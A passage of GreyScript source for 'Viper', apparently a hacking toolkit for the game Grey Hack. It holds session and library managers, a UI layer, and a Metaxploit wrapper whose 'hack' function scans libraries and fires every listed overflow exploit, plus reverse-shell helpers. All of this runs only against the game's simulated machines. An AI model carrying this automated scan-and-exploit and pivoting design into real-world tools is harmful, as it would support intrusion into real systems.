+end if
+for path in pathToFollow
+if path=="".."" then
+startingPath=startingPath.parent
+if startingPath isa Error then
+return Error.New(""Cannot go above root"")
+end if
+else if path==""."" or path=="""" then
+continue
+else
+hasChild=startingPath.hasChild(path)
+if hasChild==false then
+return Error.New(""File not found: ""+startingPath.path+""/""+path)
+end if
+startingPath=startingPath.child(path)
+end if
+end for
+return startingPath
+end function
+FileSession.goTo=function(path)
+file=self.getFile(path)
+if file isa Error then
+return file
+end if
+if file.type==FILE_TYPES.FILE then
+return Error.New(""Cannot go to a file"")
+end if
+self.current=file
+end function
+FileSession.setPermissions=function(path,permissions,recersive=false)
+file=self.getFile(path)
+if file isa Error then
+return file
+end if
+return file.setPermissions(permissions,recersive)
+end function
+FileSession.setOwner=function(path,owner,recersive=false)
+file=self.getFile(path)
+if file isa Error then
+return file
+end if
+return file.setOwner(owner,recersive)
+end function
+FileSession.setGroup=function(path,group,recersive=false)
+file=self.getFile(path)
+if file isa Error then
+return file
+end if
+return file.setGroup(group,recersive)
+end function
+FileSession.permissions=function(path)
+file=self.getFile(path)
+if file isa Error then
+return file
+end if
+return file.permissions
+end function
+FileSession.copy=function(path,newPath)
+fileToCopy=self.getFile(path)
+if fileToCopy isa Error then
+return fileToCopy
+end if
+newFileLocation=self.getFile(newPath)
+newFileName=fileToCopy.name
+if newFileLocation isa Error then
+newFileName=newPath.split(""/"").pop
+newFileLocation=self.getFile(slice(newPath.split(""/""),0,newPath.split(""/"").len-1).join(""/""))
+if newFileLocation isa Error then
+return newFileLocation
+end if
+end if
+return fileToCopy.copy(newFileLocation.path,newFileName)
+end function
+FileSession.delete=function(path)
+fileToDelete=self.getFile(path)
+if fileToDelete isa Error then
+return fileToDelete
+end if
+if self.isParentOf(self.current.path,fileToDelete.path) then
+self.current=fileToDelete.parent
+end if
+if fileToDelete.path==self.path then
+self.current=self.current.parent
+end if
+return fileToDelete.delete
+end function
+FileSession.move=function(path,newPath)
+fileToMove=self.getFile(path)
+if fileToMove isa Error then
+return fileToMove
+end if
+newFileLocation=self.getFile(newPath)
+newFileName=fileToMove.name
+if newFileLocation isa Error or newFileLocation.type==FILE_TYPES.FILE then
+newFileName=newPath.split(""/"").pop
+newFileLocation=self.getFile(slice(newPath.split(""/""),0,newPath.split(""/"").len-1).join(""/""))
+if newFileLocation isa Error then
+return newFileLocation
+end if
+end if
+return fileToMove.move(newFileLocation.path,newFileName)
+end function
+FileSession.content=function(path)
+file=self.getFile(path)
+if file isa Error then
+return file
+end if
+return file.content
+end function
+FileSession.setContent=function(path,content)
+file=self.getFile(path)
+if file isa Error then
+return file
+end if
+return file.setContent(content)
+end function
+FileSession.appendContent=function(path,content)
+file=self.getFile(path)
+if file isa Error then
+return file
+end if
+return file.appendContent(content)
+end function
+FileSession.setName=function(path,newName)
+file=self.getFile(path)
+if file isa Error then
+return file
+end if
+return file.setName(newName)
+end function
+FileSession.path=function()
+return self.current.path
+end function
+FileSession.isParentOf=function(path,childPath)
+if startsWith(childPath,path) then
+return true
+end if
+return false
+end function
+FileSession.type=function()
+return ""file""
+end function
+FileSession.privilege=function()
+if self.user!=""root"" and self.user!=""guest"" then
+return ""user""
+end if
+return self.user
+end function
+FileSession.New=function(file)
+result=new FileSession
+result.root=climbFileToRoot(file)
+result.current=file
+result.user=getUserFromHandler(result)
+return result
+end function",1);m("/root/vipersrc/managers/session/computer.src","ComputerSession=new FileSession
+ComputerSession.computer=null
+ComputerSession.setPassword=function(user,password)
+return self.computer.setPassword(user,password)
+end function
+ComputerSession.processes=function()
+return self.computer.processes
+end function
+ComputerSession.closeProcess=function(pid)
+return self.computer.closeProcess(pid)
+end function
+ComputerSession.createFolder=function(path)
+splitPath=path.split(""/"")
+name=splitPath.pop
+parent=self.getFile(splitPath.join(""/""))
+if parent isa Error then
+return parent
+end if
+return self.computer.createFolder(parent.path,name)
+end function
+ComputerSession.createFile=function(path)
+splitPath=path.split(""/"")
+name=splitPath.pop
+parent=self.getFile(splitPath.join(""/""))
+if parent isa Error then
+return parent
+end if
+return self.computer.createFile(parent.path,name)
+end function
+ShellSession.putFileTo=function(path,targetPath,otherSession)
+file=self.getFile(path)
+if file isa Error then
+return file
+end if
+if file.type!=""FILE"" then
+return Error.New(""Path is not a file"")
+end if
+folder=otherSession.getFile(targetPath)
+if folder isa Error then
+return folder
+end if
+if folder.type!=""FOLDER"" then
+return Error.New(""Target path is not a folder"")
+end if
+return self.shell.transferFile(file.path,folder.path,otherSession.shell)
+end function
+ShellSession.activate=function()
+self.shell.activate
+end function
+ShellSession.type=function()
+return ""shell""
+end function
+ShellSession.New=function(shell)
+result=new ShellSession
+result.shell=shell
+result.computer=shell.getComputer
+result.root=climbFileToRoot(result.computer.getFile(""/""))
+result.current=result.computer.getFile(""/"")
+result.user=getUserFromHandler(result)
+return result
+end function",1);m("/root/vipersrc/managers/session/session.src","Session={}
+Session.handler=null
+Session.data={""ip"":null}
+Session.New=function(handler,data)
+if handler isa Session then
+return handler
+end if
+result=new Session
+if typeof(handler)==""file"" then
+handler=computerObjectFactory(handler)
+end if
+if typeof(handler)==""computer"" then
+handler=computerObjectFactory(handler)
+end if
+if typeof(handler)==""shell"" then
+handler=computerObjectFactory(handler)
+end if
+if handler isa File then
+handler=FileSession.New(handler)
+end if
+if handler isa Computer then
+handler=ComputerSession.New(handler)
+end if
+if handler isa Shell then
+handler=ShellSession.New(handler)
+end if
+if not (handler isa ShellSession) and not (handler isa ComputerSession) and not (handler isa FileSession) then
+return Error.New(""Invalid session handler"")
+end if
+result.handler=handler
+result.data=data
+if handler isa ComputerSession or handler isa ShellSession then
+result.data={}
+result.data.ip=handler.ip
+else if handler isa FileSession and data.ip==null then
+return Error.New(""File session requires ip"")
+end if
+if handler.user==""root"" then
+handler.goTo(""/root"")
+else
+handler.goTo(""/home/""+handler.user)
+end if
+return result
+end function",1);m("/root/vipersrc/managers/session/session-manager.src","SessionManager={}
+SessionManager.mediator=null
+SessionManager.sessions=[]
+SessionManager.sessionChain=[]
+SessionManager.currentSession=null
+SessionManager.pivotSession=null
+SessionManager.addSession=function(object,data)
+session=Session.New(object,data)
+if session isa Error then
+return session
+end if
+self.sessions.push(session)
+if self.currentSession==null then
+self.setCurrentSession(0)
+end if
+if self.pivotSession==null then
+self.setPivotSession(0)
+end if
+return session
+end function
+SessionManager.removeSession=function(sessionIndex)
+i=0
+handleFilterSession=function(s)
+oldI=i
+outer.i=i+1
+return oldI!=sessionIndex
+end function
+self.sessions=filter(self.sessions,@handleFilterSession)
+end function
+SessionManager.setCurrentSession=function(sessionIndex)
+if hasIndex(self.sessions,sessionIndex) then
+self.currentSession=self.sessions[sessionIndex]
+self.sessionChain.push(self.currentSession)
+else
+return Error.New(""Session Index(""+sessionIndex+"") is out of range"")
+end if
+end function
+SessionManager.setPivotSession=function(sessionIndex)
+if hasIndex(self.sessions,sessionIndex) then
+self.pivotSession=self.sessions[sessionIndex]
+else
+return Error.New(""Session Index(""+sessionIndex+"") is out of range"")
+end if
+end function
+SessionManager.getSessionIndex=function(session)
+return indexOf(self.sessions,session)
+end function
+SessionManager.goBack=function()
+if self.sessionChain.len>1 then
+self.sessionChain.pop
+self.currentSession=self.sessionChain[self.sessionChain.len-1]
+else
+exit
+end if
+end function
+SessionManager.setMediator=function(mediator)
+self.mediator=mediator
+end function
+SessionManager.New=function()
+result=new SessionManager
+result.sessions=[]
+result.sessionChain=[]
+return result
+end function",1);m("/root/vipersrc/facades/lib-objects/metaxploit.src","Metaxploit={}
+Metaxploit.metaxploit=null
+Metaxploit.rShellList=function()
+objects=self.metaxploit.rshell_server
+if typeof(objects)==""string"" then
+return Error.New(objects)
+end if
+return map(objects,@computerObjectFactory)
+end function
+Metaxploit.connectRShell=function(address,port)
+if not is_valid_ip(address) then
+return Error.New(""Invalid IP address"")
+end if
+if typeof(port)!=""number"" and typeof(port)!=""string"" then
+return Error.New(""Invalid port"")
+end if
+if typeof(port)==""string"" then
+port=to_int(port)
+end if
+result=self.metaxploit.rshell_client(address,port,""ps"")
+if result==false then
+return Error.New(""An error occured while connecting to the server"")
+end if
+end function
+Metaxploit.getLib=function(address,port)
+if is_valid_ip(address) then
+if port==null then
+return Error.New(""Port is null"")
+end if
+result=self.metaxploit.net_use(address,to_int(port))
+if result==null then
+return Error.New(""An error occured while connecting to the server"")
+end if
+return result.dump_lib
+else
+result=self.metaxploit.load(address)
+if result==null then
+return Error.New(""An error occured while loading the library"")
+end if
+return result
+end if
+end function
+Metaxploit.hack=function(lib,options)
+vulnaribilities=self.getVulnerabilities(lib)
+if vulnaribilities isa Error then
+return vulnaribilities
+end if
+handleHack=function(vulnaribility)
+exploits=vulnaribility[1]
+results=[]
+for exploit in exploits
+if options==null then
+options=""""
+end if
+result=lib.overflow(vulnaribility[0],exploit,options)
+if result==string or result==null or result==number then
+continue
+end if
+results.push(computerObjectFactory(result))
+end for
+return results
+end function
+handleFilter=function(vulnaribility)
+return vulnaribility!=null
+end function
+return flat(filter(map(vulnaribilities,@handleHack),@handleFilter))
+end function
+Metaxploit.getVulnerabilities=function(lib)
+vulnaribleAreas=self.metaxploit.scan(lib)
+if vulnaribleAreas==null then
+return Error.New(""An error occured while scanning the library"")
+end if
+metaxploit=self.metaxploit
+handleGetVulnerableString=function(vulnaribleArea)
+vulnaribilities=outer.metaxploit.scan_address(lib,vulnaribleArea)
+if vulnaribilities==null then
+return null
+end if
+exploits=[]
+segments=vulnaribilities.split(""Unsafe check: "")[1:]
+for segment in segments
+labelStart=segment.indexOf(""<b>"")
+labelEnd=segment.indexOf(""</b>"")
+exploits.push(segment[labelStart+3:labelEnd])
+end for
+return [vulnaribleArea,exploits]
+end function
+handleFilter=function(vulnaribleArea)
+return vulnaribleArea!=null
+end function
+return filter(map(vulnaribleAreas,@handleGetVulnerableString),@handleFilter)
+end function
+Metaxploit.New=function(object)
+if typeof(object)!=""MetaxploitLib"" then
+return Error.New(""Object is not a MetaxploitLib"")
+end if
+result=new Metaxploit
+result.metaxploit=object
+return result
+end function",1);m("/root/vipersrc/facades/lib-objects/crypto.src","Crypto={}
+Crypto.crypto=null
+Crypto.decipher=function(str)
+result=self.crypto.decipher(str)
+if result==null then
+return Error.New(""Decipher failed"")
+end if
+return result
+end function
+Crypto.New=function(object)
+if typeof(object)!=""cryptoLib"" then
+return Error.New(""Invalid crypto object"")
+end if
+result=new Crypto
+result.crypto=object
+return result
+end function",1);m("/root/vipersrc/managers/lib/lib-manager.src","LIB_TYPES={}
+LIB_TYPES.METAXPLOIT=""metaxploit""
+LIB_TYPES.CRYPTO=""crypto""
+Lib={}
+Lib.data={""ip"":null,""version"":null}
+Lib.lib=null
+Lib.type=""unknown""
+Lib.setIp=function(ip)
+self.data.ip=ip
+end function
+Lib.ip=function()
+return self.data.ip
+end function
+Lib.version=function()
+return self.data.version
+end function
+Lib.New=function(lib,data)
+result=new Lib
+result.lib=lib
+result.data={}
+result.data.ip=null
+result.data.version=""unknown""
+result.type=""unknown""
+if not (data.hasIndex(""ip"")) then
+return Error.New(""Lib data must have ip"")
+end if
+if data.hasIndex(""version"") then
+result.data.version=data.version
+end if
+result.data.ip=data.ip
+if typeof(lib)==""MetaxploitLib"" then
+result.lib=Metaxploit.New(lib)
+end if
+if result.lib isa Metaxploit then
+result.type=LIB_TYPES.METAXPLOIT
+end if
+if typeof(lib)==""cryptoLib"" then
+result.lib=Crypto.New(lib)
+end if
+if result.lib isa Crypto then
+result.type=LIB_TYPES.CRYPTO
+end if
+if result.type==""unknown"" then
+return Error.New(""Lib type must be known"")
+end if
+return result
+end function
+LibManager={}
+LibManager.mediator=null
+LibManager.libs=[]
+LibManager.currentLibs={LIB_TYPES.METAXPLOIT:null,LIB_TYPES.CRYPTO:null}
+LibManager.pivotLibs={LIB_TYPES.METAXPLOIT:null,LIB_TYPES.CRYPTO:null}
+LibManager.addLib=function(lib,data)
+lib=Lib.New(lib,data)
+if lib isa Error then
+return lib
+end if
+self.libs.push(lib)
+if self.currentLibs[lib.type]==null then
+self.currentLibs[lib.type]=lib
+end if
+if self.pivotLibs[lib.type]==null then
+self.pivotLibs[lib.type]=lib
+end if
+findMetaxploitOnIp=function(lib)
+if lib.type==LIB_TYPES.METAXPLOIT and lib.ip.local==data.ip.local and lib.ip.public==data.ip.public then
+return true
+end if
+return false
+end function
+if lib.type==LIB_TYPES.METAXPLOIT then
+metalib=lib.lib.getLib(data.path)
+if metalib==null then
+return Error.New(""Metaxploit lib not found"")
+end if
+lib.data.version=metalib.version
+else if some(self.libs,@findMetaxploitOnIp) then
+metaxploit=find(self.libs,@findMetaxploitOnIp)
+if metaxploit==null then
+return Error.New(""Metaxploit lib not found"")
+end if
+metalib=metaxploit.lib.getLib(data.path)
+if metalib==null then
+return Error.New(""Metaxploit lib not found"")
+end if
+lib.data.version=metalib.version
+end if
+end function
+LibManager.getLib=function(id)
+if self.libs.hasIndex(id) then
+return self.libs[id]
+end if
+return Error.New(""Lib with id ""+id+"" not found"")
+end function
+LibManager.getCurrentLib=function(libType)
+return self.currentLibs[libType]
+end function
+LibManager.setCurrentLib=function(lib)
+self.currentLibs[lib.type]=lib
+end function
+LibManager.getPivotLib=function(libType)
+return self.pivotLibs[libType]
+end function
+LibManager.setPivotLib=function(libType,lib)
+self.pivotLibs[libType]=lib
+end function
+LibManager.setMediator=function(mediator)
+self.mediator=mediator
+end function
+LibManager.New=function()
+result=new LibManager
+result.libs=[]
+result.currentLibs={LIB_TYPES.METAXPLOIT:null,LIB_TYPES.CRYPTO:null}
+result.pivotLibs={LIB_TYPES.METAXPLOIT:null,LIB_TYPES.CRYPTO:null}
+return result
+end function",1);m("/root/vipersrc/managers/lib/metaxploit-manager.src","MetaxploitManager={}
+MetaxploitManager.mediator=null
+MetaxploitManager.rShellList=function()
+libManager=self.mediator.getExtension(""libManager"")
+if libManager.getCurrentLib(LIB_TYPES.METAXPLOIT)==null then
+return Error.New(""No metaxploit library loaded"")
+end if
+currentMetaxploit=libManager.getCurrentLib(LIB_TYPES.METAXPLOIT).lib
+return currentMetaxploit.rShellList
+end function
+MetaxploitManager.connectRShell=function(address,port)
+libManager=self.mediator.getExtension(""libManager"")
+if libManager.getCurrentLib(LIB_TYPES.METAXPLOIT)==null then
+return Error.New(""No metaxploit library loaded"")
+end if
+currentMetaxploit=libManager.getCurrentLib(LIB_TYPES.METAXPLOIT).lib
+return currentMetaxploit.connectRShell(address,port)
+end function
+MetaxploitManager.getLib=function(address,port)
+libManager=self.mediator.getExtension(""libManager"")
+if libManager.getCurrentLib(LIB_TYPES.METAXPLOIT)==null then
+return Error.New(""No metaxploit library loaded"")
+end if
+currentMetaxploit=libManager.getCurrentLib(LIB_TYPES.METAXPLOIT).lib
+return currentMetaxploit.getLib(address,port)
+end function
+MetaxploitManager.hack=function(address,port,options)
+libManager=self.mediator.getExtension(""libManager"")
+if libManager.getCurrentLib(LIB_TYPES.METAXPLOIT)==null then
+return Error.New(""No metaxploit library loaded"")
+end if
+currentMetaxploit=libManager.getCurrentLib(LIB_TYPES.METAXPLOIT).lib
+if libManager.getPivotLib(LIB_TYPES.METAXPLOIT)==null then
+return Error.New(""No metaxploit pivot library loaded"")
+end if
+pivotMetaxploit=libManager.getPivotLib(LIB_TYPES.METAXPLOIT).lib
+if is_valid_ip(address)==false then
+sessionManager=self.mediator.getExtension(""sessionManager"")
+session=sessionManager.currentSession
+handler=session.handler
+address=handler.getFile(address)
+if address isa Error then
+return address
+end if
+address=address.path
+end if
+lib=currentMetaxploit.getLib(address,port)
+if lib isa Error then
+return lib
+end if
+if is_valid_ip(port) then
+options=port
+end if
+return pivotMetaxploit.hack(lib,options)
+end function
+MetaxploitManager.setMediator=function(mediator)
+self.mediator=mediator
+end function
+MetaxploitManager.New=function()
+self=new MetaxploitManager
+self.mediator=null
+return self
+end function",1);m("/root/vipersrc/managers/theme/theme-manager.src","color=function(hex)
+result=function(str)
+return ""<color=""+hex+"">""+str+""</color>""
+end function
+return @result
+end function
+THEME_COLORS={""HIGHLIGHT"":""highlight"",""TEXT"":""text"",""SECONDARY"":""secondary"",""WARNING"":""warning"",""INFO"":""info"",""SUCCESS"":""success"",""DANGER"":""danger"",""ERROR"":""error""}
+ThemeManager={}
+ThemeManager.mediator=null
+ThemeManager.colors={""highlight"":""#c3201f"",""text"":""#fff"",""secondary"":""#343434"",""warning"":""#fffc33"",""info"":""#058fab"",""success"":""#0f0"",""danger"":""#c3201f"",""error"":""#c3201f""}
+ThemeManager.colorText=function(color,str)
+color=self.color(color)
+return color(str)
+end function
+ThemeManager.color=function(name,str)
+return @color(self.colors[name])
+end function
+ThemeManager.setMediator=function(mediator)
+self.mediator=mediator
+end function
+ThemeManager.init=function()
+configManager=self.mediator.getExtension(""configManager"")
+if not configManager.config.hasIndex(""theme"") then
+configManager.saveConfig({""theme"":self.colors})
+end if
+self.colors=self.colors+configManager.config.theme
+configManager.saveConfig({""theme"":themeManager.colors})
+end function
+ThemeManager.New=function()
+result=new ThemeManager
+result.colors=ThemeManager.colors
+return result
+end function",1);m("/root/vipersrc/managers/ui/viper-ui.src","COLORS={""RED"":""#c3201f"",""GREEN"":""#0f0"",""YELLOW"":""#FFFC33"",""BLUE"":""#058FAB"",""GRAY"":""#343434"",""WHITE"":""#fff""}
+addSpaceString=function(string,spaces)
+for i in range(0,spaces-1)
+string=string+"" ""
+end for
+return string
+end function
+
+themeManager=self.mediator.getExtension(""themeManager"")
+keys=[""permissions"",""owner"",""name"",""size""]
+handleGetItem=function(item)
+result={}
+result.permissions={""text"":item.permissions,""color"":@themeManager.color(THEME_COLORS.WARNING)}
+result.owner={""text"":item.owner,""color"":@themeManager.color(THEME_COLORS.SUCCESS)}
+result.name={""text"":item.name,""color"":@themeManager.color(THEME_COLORS.INFO)}
+if item.type==""FILE"" then
+result.name.color=@themeManager.color(THEME_COLORS.SECONDARY)
+end if
+result.size={""text"":item.size,""color"":@themeManager.color(THEME_COLORS.SECONDARY)}
+return result
+end function
+items=map(children,@handleGetItem)
+self.displayTable(keys,items)
+print
+end function
+ViperUi.targets=function(sessions)
+themeManger=self.mediator.getExtension(""themeManager"")
+keys=[""id"",""user"",""public ip"",""local ip"",""handler""]
+i=0
+handleGetItem=function(session)
+result={}
+result.id={""text"":str(i),""color"":@themeManger.color(THEME_COLORS.WARNING)}
+result.user={""text"":session.handler.user,""color"":@themeManger.color(THEME_COLORS.SUCCESS)}
+result[""public ip""]={""text"":session.data.ip.public,""color"":@themeManger.color(THEME_COLORS.INFO)}
+result[""local ip""]={""text"":session.data.ip.local,""color"":@themeManger.color(THEME_COLORS.INFO)}
+result.handler={""text"":session.handler.type,""color"":@themeManger.color(THEME_COLORS.SECONDARY)}
+outer.i=outer.i+1
+return result
+end function
+items=map(sessions,@handleGetItem)
+self.displayTable(keys,items)
+print
+end function
+ViperUi.libs=function(libs)
+themeManager=self.mediator.getExtension(""themeManager"")
+keys=[""id"",""library"",""version"",""public ip"",""local ip"",""pivot"",""current""]
+i=0
+handleGetItem=function(lib)
+pivot=lib.pivot
+current=lib.current
+lib=lib.lib
+result={}
+result.id={""text"":str(i),""color"":@themeManager.color(THEME_COLORS.WARNING)}
+result.library={""text"":lib.type,""color"":@themeManager.color(THEME_COLORS.SUCCESS)}
+result.version={""text"":lib.data.version,""color"":@themeManager.color(THEME_COLORS.INFO)}
+result[""public ip""]={""text"":lib.data.ip.public,""color"":@themeManager.color(THEME_COLORS.INFO)}
+result[""local ip""]={""text"":lib.data.ip.local,""color"":@themeManager.color(THEME_COLORS.INFO)}
+result.pivot={""text"":"""",""color"":@themeManager.color(THEME_COLORS.SECONDARY)}
+if pivot then
+result.pivot.text=""  *""
+result.pivot.color=@themeManager.color(THEME_COLORS.SUCCESS)
+end if
+result.current={""text"":"""",""color"":@themeManager.color(THEME_COLORS.SECONDARY)}
+if current then
+result.current.text=""   *""
+result.current.color=@themeManager.color(THEME_COLORS.SUCCESS)
+end if
+outer.i=outer.i+1
+return result
+end function
+items=map(libs,@handleGetItem)
+self.displayTable(keys,items)
+print
+end function
+ViperUi.ps=function(processes)
+themeManger=self.mediator.getExtension(""themeManager"")
+keys=[""user"",""pid"",""cpu"",""mem"",""name""]
+handleGetItem=function(process)
+result={}
+result.user={""text"":process.USER,""color"":@themeManger.color(THEME_COLORS.SUCCESS)}
+result.pid={""text"":str(process.PID),""color"":@themeManger.color(THEME_COLORS.WARNING)}
+result.cpu={""text"":str(process.CPU),""color"":@themeManger.color(THEME_COLORS.INFO)}
+result.mem={""text"":str(process.MEM),""color"":@themeManger.color(THEME_COLORS.INFO)}
+result.name={""text"":process.COMMAND,""color"":@themeManger.color(THEME_COLORS.SECONDARY)}
+return result
+end function
+items=map(processes,@handleGetItem)
+self.displayTable(keys,items)
+end function
+ViperUi.currentLibs=function(libs)
+themeManager=self.mediator.getExtension(""themeManager"")
+keys=[""library"",""version"",""public ip"",""local ip""]
+handleGetItem=function(lib)
+if lib==null then
+return null
+end if
+result={}
+result.library={""text"":lib.type,""color"":@themeManager.color(THEME_COLORS.SUCCESS)}
+result.version={""text"":lib.data.version,""color"":@themeManager.color(THEME_COLORS.INFO)}
+result[""public ip""]={""text"":lib.data.ip.public,""color"":@themeManager.color(THEME_COLORS.INFO)}
+result[""local ip""]={""text"":lib.data.ip.local,""color"":@themeManager.color(THEME_COLORS.INFO)}
+return result
+end function
+filterNull=function(item)
+return item!=null
+end function
+items=filter(map(libs,@handleGetItem),@filterNull)
+self.displayTable(keys,items)
+print
+end function
+ViperUi.nmap=function(devices,router)
+themeManager=self.mediator.getExtension(""themeManager"")
+keys=[""host"",""port"",""forwarded"",""state"",""service"",""version""]
+handleGetItem=function(device)
+result={}
+result.host={""text"":device.local,""color"":@themeManager.color(THEME_COLORS.SUCCESS)}
+result.port={""text"":str(device.port),""color"":@themeManager.color(THEME_COLORS.INFO)}
+if device.forwarded then
+result.forwarded={""text"":""TRUE"",""color"":@themeManager.color(THEME_COLORS.SUCCESS)}
+else
+result.forwarded={""text"":""FALSE"",""color"":@themeManager.color(THEME_COLORS.ERROR)}
+end if
+if device.open then
+result.state={""text"":""OPEN"",""color"":@themeManager.color(THEME_COLORS.SUCCESS)}
+else
+result.state={""text"":""CLOSED"",""color"":@themeManager.color(THEME_COLORS.ERROR)}
+end if
+result.service={""text"":device.type,""color"":@themeManager.color(THEME_COLORS.SECONDARY)}
+result.version={""text"":device.version,""color"":@themeManager.color(THEME_COLORS.SECONDARY)}
+return result
+end function
+items=map(devices,@handleGetItem)
+print
+print(themeManager.colorText(THEME_COLORS.HIGHLIGHT,""IP: ""+themeManager.colorText(THEME_COLORS.SUCCESS,router.ip.public)))
+print(themeManager.colorText(THEME_COLORS.HIGHLIGHT,""ESSID: ""+themeManager.colorText(THEME_COLORS.SUCCESS,router.name)))
+print(themeManager.colorText(THEME_COLORS.HIGHLIGHT,""BSSID: ""+themeManager.colorText(THEME_COLORS.SUCCESS,router.id)))
+print
+self.displayTable(keys,items)
+print
+end function
+ViperUi.msfConsole=function(shells)
+themeManager=self.mediator.getExtension(""themeManager"")
+keys=[""id"",""public ip"",""local ip"",""user""]
+i=0
+handleGetItem=function(shell)
+result={}
+result.id={""text"":str(i),""color"":@themeManager.color(THEME_COLORS.WARNING)}
+result[""public ip""]={""text"":shell.handler.ip.public,""color"":@themeManager.color(THEME_COLORS.INFO)}
+result[""local ip""]={""text"":shell.handler.ip.local,""color"":@themeManager.color(THEME_COLORS.INFO)}
+result.user={""text"":shell.handler.user,""color"":@themeManager.color(THEME_COLORS.SUCCESS)}
+outer.i=outer.i+1
+return result
+end function
+items=map(shells,@handleGetItem)
+self.displayTable(keys,items)
+end function
+ViperUi.msfConsoleInput=function()
+themeManger=self.mediator.getExtension(""themeManager"")
+return themeManger.colorText(THEME_COLORS.HIGHLIGHT,""ID: "")
+end function
+ViperUi.helpSingle=function(command)
+themeManger=self.mediator.getExtension(""themeManager"")
+commandNameColor=@themeManger.color(THEME_COLORS.WARNING)
+if command.hasPermissions then
+commandNameColor=@themeManger.color(THEME_COLORS.SUCCESS)
+end if
+parametersString=""""
+for parameter in command.parameters
+if parameter.required then
+parametersString=parametersString+""[""
+end if
+if not parameter.required then
+parametersString=parametersString+""(""
+end if
+if parameter.type==""options"" then
+optionsString=""""
+for option in parameter.options
+optionsString=optionsString+option.key+""|""
+end for
+optionsString=optionsString[:-1]
+parametersString=parametersString+optionsString
+else if parameter.type==""flag"" then
+parametersString=parametersString+parameter.flag
+else
+parametersString=parametersString+parameter.name
+end if
+if parameter.required then
+parametersString=parametersString+""] ""
+end if
+if not parameter.required then
+parametersString=parametersString+"") ""
+end if
+end for
+print(themeManger.colorText(THEME_COLORS.HIGHLIGHT,""Command: "")+commandNameColor(command.name+"" ""+parametersString))
+print(themeManger.colorText(THEME_COLORS.HIGHLIGHT,""Description: "")+themeManger.colorText(THEME_COLORS.TEXT,command.description))
+print
+end function
+ViperUi.help=function(commands)
+themeManger=self.mediator.getExtension(""themeManager"")
+keys=[""command"",""arguments"",""description""]
+handleGetItem=function(command)
+result={}
+commandNameColor=@themeManger.color(THEME_COLORS.ERROR)
+if command.hasPermissions then
+commandNameColor=@themeManger.color(THEME_COLORS.SUCCESS)
+end if
+result.command={""text"":command.name,""color"":@commandNameColor}
+parametersString=""""
+for parameter in command.parameters
+if parameter.required then
+parametersString=parametersString+""[""
+end if
+if not parameter.required then
+parametersString=parametersString+"" (""
+end if
+if parameter.type==""options"" then
+optionsString=""""
+for option in parameter.options
+optionsString=optionsString+option.key+""|""
+end for
+optionsString=optionsString[:-1]
+parametersString=parametersString+optionsString
+else if parameter.type==""flag"" then
+parametersString=parametersString+parameter.flag
+else
+parametersString=parametersString+parameter.name
+end if
+if parameter.required then
+parametersString=parametersString+""] ""
+end if
+if not parameter.required then
+parametersString=parametersString+"") ""
+end if
+end for
+result.arguments={""text"":parametersString,""color"":@themeManger.color(THEME_COLORS.INFO)}
+result.description={""text"":command.description,""color"":@themeManger.color(THEME_COLORS.TEXT)}
+return result
+end function
+items=map(commands,@handleGetItem)
+self.displayTable(keys,items)
+end function
+ViperUi.fileSystem=function(file,depth=0)
+seperator=""""
+for i in range(0,depth-1)
+if depth==0 then
+break
+end if
+seperator=seperator+""――""
+end for
+seperator=seperator+""»""
+print(seperator+self.fileSystemItem(file))
+if file.children isa Error then
+return 
+end if
+for child in file.children
+self.fileSystem(child,depth+1)
+end for
+end function
+ViperUi.fileSystemItem=function(file)
+themeManager=self.mediator.getExtension(""themeManager"")
+result=themeManager.colorText(THEME_COLORS.WARNING,file.permissions)+"" ""+themeManager.colorText(THEME_COLORS.SUCCESS,file.owner)+"" ""+themeManager.colorText(THEME_COLORS.INFO,file.group)+"" ""+themeManager.colorText(THEME_COLORS.SECONDARY,file.name)+"" ""+themeManager.colorText(THEME_COLORS.SECONDARY,file.size)
+return result
+end function
+ViperUi.displaySession=function(session)
+themeManger=self.mediator.getExtension(""themeManager"")
+handler=session.handler
+ip=session.data.ip
+name=""file""
+if handler.type!=""file"" then
+name=handler.name
+end if
+result=""<color=""+COLORS.GRAY+""><pos=4.95>———(""+handler.user+""@""+""<color=""+COLORS.RED+"">""+name+""</color>""+"")——[""+""<color=""+COLORS.RED+"">""+ip.public+""</color>""+""]——[""+ip.local+""]——[""+""<color=""+COLORS.RED+"">""+handler.path+""</color>""+""]——[""+""<color=""+COLORS.GREEN+"">""+handler.type+""</color>""+""]<voffset=-0.35em><pos=0><rotate=90>—<pos=0><voffset=-0.7em>—<pos=0><voffset=-1.05em>—<rotate=0><pos=4.95><voffset=-1.4em>——<#c3201f>$</color></color> ""
+return result
+end function
+ViperUi.init=function()
+print(viperCoolText)
+print
+print(""<color=""+COLORS.GRAY+"">""+""<color=""+COLORS.RED+"">""+""Version""+""</color>""+"": ""+""<color=""+COLORS.GREEN+"">""+""3.1.5""+""</color>""+""</color>"")
+print
+end function
+ViperUi.displayTable=function(keys,items)
+themeManger=self.mediator.getExtension(""themeManager"")
+longestItemPerKey={}
+for key in keys
+longestItemPerKey[key]=key.len
+end for
+for item in items
+for key in keys
+if item[key].text.len>longestItemPerKey[key] then
+longestItemPerKey[key]=item[key].text.len
+end if
+end for
+end for
+keysString=""""
+for key in keys
+keysString=keysString+themeManger.colorText(THEME_COLORS.HIGHLIGHT,addSpaceString(key.upper,longestItemPerKey[key]-key.len+2))
+end for
+print(keysString)
+seperatorString=""""
+for key in keys
+string=""""
+for i in range(0,key.len-1)
+string=string+""-""
+end for
+seperatorString=seperatorString+themeManger.colorText(THEME_COLORS.SECONDARY,addSpaceString(string,longestItemPerKey[key]-string.len+2))
+end for
+print(seperatorString)
+for item in items
+string=""""
+for key in keys
+keyRes=addSpaceString(item[key].text,longestItemPerKey[key]-item[key].text.len+2)
+string=string+item[key].color(keyRes)
+end for
+print(string)
+end for
+end function
+ViperUi.setMediator=function(mediator)
+self.mediator=mediator
+end function
+ViperUi.New=function()
+if ViperUi.singleton!=null then
+return ViperUi.singleton
+end if
+ViperUi.singleton=new ViperUi
+return ViperUi.singleton
+end function",1);m("/root/vipersrc/facades/network/router.src","Router={}
+Router.router=null
+Router.id=function()
+return self.router.bssid_name
+end function
+Router.name=function()
+return self.router.essid_name
+end function
+Router.version=function()
+return self.router.kernel_version
+end function
+Router.ip=function()
+result={}
+result.local=self.router.local_ip
+result.public=self.router.public_ip
+return result
+end function
+Router.devices=function()
+ips=self.router.devices_lan_ip
+router=self.router
+handleGetDevicePorts=function(device)
+result={}
+result.ip=device
+result.ports=router.device_ports(device)
+return result
+end function
+devicesWithPorts=map(ips,@handleGetDevicePorts)
+forwardedPorts=router.used_ports
+handleFindPortInUsedPorts=function(port)
+handleHasPort=function(usedPort)
